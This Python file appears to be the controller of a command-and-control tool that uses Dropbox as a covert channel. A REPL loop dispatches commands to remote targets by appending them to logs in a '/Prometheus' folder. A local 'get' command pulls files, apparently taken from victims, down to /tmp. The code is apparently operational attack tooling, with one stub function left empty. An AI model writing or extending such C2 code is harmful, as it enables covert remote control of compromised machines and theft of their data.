import time

import ccchanel.log as cclog
import ccchanel.file as ccfile
import ccchanel.dropbox_api as cc_api
import server.cmd as scmd
import server.repl as srepl
def check_pong(dbx, path):
    log = cclog.log_read(dbx, path)

def dispatch_command(dbx, path, command, *args):
    payload = scmd.command_create(command, *args)
    cclog.log_append(dbx, path, payload)

def handle_local_command(dbx, command, *args):
    if command == 'get':
        ccfile.download_file_as(dbx, args[0], f'/tmp/{args[0].replace("/", "_")}')

if __name__ == "__main__":
    dbx = cc_api.dropbox_login()
    path = "/Prometheus"
    while True:
        parsed_cmd = srepl.parse_command()
        if parsed_cmd is not None:
            if parsed_cmd.get('remote', False):
                cmd = parsed_cmd['remote']
                dispatch_command(dbx, cmd['target'], cmd['command'], *cmd['args'])
            elif parsed_cmd.get('local', False):
                cmd = parsed_cmd['local']
                handle_local_command(dbx, cmd['command'], *cmd['args'])
